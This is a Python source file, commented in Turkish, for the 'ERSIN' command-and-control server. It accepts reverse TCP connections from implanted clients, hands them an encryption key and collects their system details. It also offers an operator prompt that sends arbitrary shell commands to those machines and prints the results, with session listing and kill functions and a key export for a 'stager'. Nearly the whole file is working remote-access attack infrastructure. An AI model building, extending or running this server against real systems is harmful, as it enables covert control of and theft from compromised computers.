"""
ERSIN - C2 Server (Komuta & Kontrol Sunucusu)
Reverse TCP bağlantıları kabul eder, oturumları yönetir.
"""

import socket
import threading
import time
import json
import os
from datetime import datetime
from typing import Dict, Optional

from shared.config import (
    DEFAULT_C2_HOST, DEFAULT_C2_PORT, DEFAULT_BUFFER_SIZE,
    MAX_CONNECTIONS, CONNECTION_TIMEOUT, Colors, log_event,
    CMD_HEARTBEAT, CMD_HEARTBEAT_ACK, CMD_SHELL, CMD_SHELL_RESULT,
    CMD_SYSINFO, CMD_EXIT, CMD_KILL, LOG_DIR, LOOT_DIR,
)
from shared.crypto import ErsinCrypto
from shared.protocol import ErsinProtocol, send_message, recv_message, SocketTimeout, ConnectionLost


class Session:
    """Bir client oturumunu temsil eder."""

    def __init__(self, session_id: int, conn: socket.socket, addr: tuple,
                 protocol: ErsinProtocol):
        self.session_id = session_id
        self.conn = conn
        self.addr = addr
        self.protocol = protocol
        self.connected_at = datetime.now()
        self.last_heartbeat = time.time()
        self.sysinfo = {}
        self.active = True

    def __str__(self):
        status = Colors.colorize("●", Colors.GREEN) if self.active else Colors.colorize("○", Colors.RED)
        return (
            f"{status} Session #{self.session_id} | "
            f"{self.addr[0]}:{self.addr[1]} | "
            f"Bağlantı: {self.connected_at.strftime('%H:%M:%S')} | "
            f"OS: {self.sysinfo.get('os', '?')}"
        )


class C2Server:
    """ERSIN C2 Sunucusu."""

    def __init__(self, host: str = DEFAULT_C2_HOST, port: int = DEFAULT_C2_PORT):
        self.host = host
        self.port = port
        self.sessions: Dict[int, Session] = {}
        self.session_counter = 0
        self.crypto = ErsinCrypto()
        self.running = False
        self.server_socket: Optional[socket.socket] = None
        self._lock = threading.Lock()

        # Port bilgisi
        self._bound_port = None

    def start(self):
        """Sunucuyu başlat."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(MAX_CONNECTIONS)
            self._bound_port = self.port
            self.running = True

            print(Colors.success(f"C2 Sunucu başlatıldı: {self.host}:{self.port}"))
            print(Colors.info(f"Şifreleme anahtarı: {self.crypto.get_key_hex()[:16]}..."))
            log_event("SERVER", "C2 sunucu başlatıldı", {"host": self.host, "port": self.port})

            # Heartbeat thread
            hb_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
            hb_thread.start()

            # Bağlantı kabul döngüsü
            self._accept_loop()

        except OSError as e:
            print(Colors.error(f"Sunucu başlatılamadı: {e}"))
            log_event("ERROR", f"Sunucu başlatılamadı: {e}")
            self._close_port()

    def _accept_loop(self):
        """Gelen bağlantıları kabul et."""
        print(Colors.info("Bağlantı bekleniyor..."))
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                # Sadece ilk handshake için timeout, sonra kaldırılacak
                conn.settimeout(CONNECTION_TIMEOUT)
                print(Colors.success(f"Yeni bağlantı: {addr[0]}:{addr[1]}"))
                log_event("CONNECTION", f"Yeni bağlantı: {addr[0]}:{addr[1]}")

                # Anahtar değişimi
                conn.sendall(self.crypto.key)

                # Session oluştur
                with self._lock:
                    self.session_counter += 1
                    protocol = ErsinProtocol(self.crypto)
                    session = Session(self.session_counter, conn, addr, protocol)
                    self.sessions[self.session_counter] = session

                # Sysinfo iste
                send_message(conn, session.protocol, CMD_SYSINFO)
                response = recv_message(conn, session.protocol)
                if response and response.get("cmd") == CMD_SYSINFO:
                    session.sysinfo = response.get("data", {})

                # Handshake bitti, timeout'u uzat (oturum idle kalabilir)
                conn.settimeout(None)  # Blocking mod - heartbeat ile canlılık kontrol edilir

                print(Colors.success(f"Oturum #{session.session_id} oluşturuldu"))

                # Client handler thread
                thread = threading.Thread(
                    target=self._handle_session,
                    args=(session,),
                    daemon=True
                )
                thread.start()

            except socket.timeout:
                continue
            except OSError:
                if self.running:
                    continue
                break

    def _handle_session(self, session: Session):
        """Tek bir oturumu yönet (arka plan thread)."""
        while session.active and self.running:
            try:
                msg = recv_message(session.conn, session.protocol)
                if msg is None:
                    # Protokol çözümleme hatası, ama bağlantı hala açık
                    continue

                cmd = msg.get("cmd", "")
                if cmd == CMD_HEARTBEAT:
                    session.last_heartbeat = time.time()
                    send_message(session.conn, session.protocol, CMD_HEARTBEAT_ACK)
                elif cmd == CMD_SHELL_RESULT:
                    # Shell sonucu ayrıca interactive modda gösterilir
                    pass

            except SocketTimeout:
                # Timeout oldu ama bağlantı hala geçerli, devam et
                continue
            except ConnectionLost:
                # Bağlantı gerçekten koptu
                print(Colors.warning(f"Oturum #{session.session_id} bağlantısı koptu"))
                break
            except Exception:
                break

        self._remove_session(session.session_id)

    def _heartbeat_loop(self):
        """Oturum heartbeat kontrolü."""
        while self.running:
            time.sleep(10)
            now = time.time()
            dead_sessions = []
            with self._lock:
                for sid, session in self.sessions.items():
                    if now - session.last_heartbeat > CONNECTION_TIMEOUT * 2:
                        dead_sessions.append(sid)

            for sid in dead_sessions:
                print(Colors.warning(f"Oturum #{sid} zaman aşımı - kaldırılıyor"))
                self._remove_session(sid)

    def _remove_session(self, session_id: int):
        """Oturumu kaldır ve bağlantıyı kapat."""
        with self._lock:
            session = self.sessions.pop(session_id, None)
        if session:
            session.active = False
            try:
                session.conn.close()
            except Exception:
                pass
            print(Colors.warning(f"Oturum #{session_id} kapatıldı"))
            log_event("DISCONNECT", f"Oturum #{session_id} kapatıldı",
                       {"addr": f"{session.addr[0]}:{session.addr[1]}"})

    def interact(self, session_id: int):
        """Bir oturumla etkileşime geç (reverse shell)."""
        session = self.sessions.get(session_id)
        if not session:
            print(Colors.error(f"Oturum #{session_id} bulunamadı"))
            return
        if not session.active:
            print(Colors.error(f"Oturum #{session_id} aktif değil"))
            return

        print(Colors.info(f"Oturum #{session_id} ile etkileşim başlatılıyor..."))
        print(Colors.info("Çıkmak için 'background' veya 'exit' yazın"))
        print()

        # Etkileşim sırasında timeout ayarla (yanıt beklemek için)
        old_timeout = session.conn.gettimeout()
        session.conn.settimeout(60)

        while session.active:
            try:
                cmd_input = input(
                    f"{Colors.RED}ERSIN{Colors.RESET}"
                    f"({Colors.CYAN}session:{session_id}{Colors.RESET}) > "
                )
                cmd_input = cmd_input.strip()
                if not cmd_input:
                    continue
                if cmd_input.lower() in ("background", "bg"):
                    print(Colors.info("Arka plana alındı"))
                    break
                if cmd_input.lower() == "exit":
                    print(Colors.info("Oturumdan çıkılıyor"))
                    break

                # Komutu gönder
                send_message(session.conn, session.protocol, CMD_SHELL,
                             {"command": cmd_input})

                # Sonucu al
                try:
                    response = recv_message(session.conn, session.protocol)
                    if response and response.get("cmd") == CMD_SHELL_RESULT:
                        output = response["data"].get("output", "")
                        error = response["data"].get("error", "")
                        if output:
                            print(output)
                        if error:
                            print(Colors.error(error))
                    else:
                        print(Colors.error("Yanıt alınamadı"))
                except SocketTimeout:
                    print(Colors.warning("Komut zaman aşımına uğradı"))
                except ConnectionLost:
                    print(Colors.error("Bağlantı koptu"))
                    break

            except (KeyboardInterrupt, EOFError):
                print()
                print(Colors.info("Arka plana alındı"))
                break
            except Exception as e:
                print(Colors.error(f"Hata: {e}"))
                break

        # Timeout'u eski haline döndür
        try:
            session.conn.settimeout(old_timeout)
        except Exception:
            pass

    def list_sessions(self):
        """Aktif oturumları listele."""
        if not self.sessions:
            print(Colors.warning("Aktif oturum yok"))
            return

        print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  Aktif Oturumlar ({len(self.sessions)}){Colors.RESET}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
        for session in self.sessions.values():
            print(f"  {session}")
        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")

    def kill_session(self, session_id: int):
        """Bir oturumu sonlandır."""
        session = self.sessions.get(session_id)
        if session:
            try:
                send_message(session.conn, session.protocol, CMD_KILL)
            except Exception:
                pass
            self._remove_session(session_id)
            print(Colors.success(f"Oturum #{session_id} sonlandırıldı"))
        else:
            print(Colors.error(f"Oturum #{session_id} bulunamadı"))

    def stop(self):
        """Sunucuyu durdur ve tüm portları kapat."""
        print(Colors.warning("Sunucu durduruluyor..."))
        self.running = False

        # Tüm oturumları kapat
        session_ids = list(self.sessions.keys())
        for sid in session_ids:
            self._remove_session(sid)

        # Port kapat
        self._close_port()
        print(Colors.success("Sunucu durduruldu, port kapatıldı"))
        log_event("SERVER", "Sunucu durduruldu")

    def _close_port(self):
        """Server socket'i kapat ve portu serbest bırak."""
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
            self.server_socket = None
            if self._bound_port:
                print(Colors.info(f"Port {self._bound_port} kapatıldı"))
                self._bound_port = None

    def get_encryption_key(self) -> str:
        """Şifreleme anahtarını döndür (stager için)."""
        return self.crypto.get_key_hex()
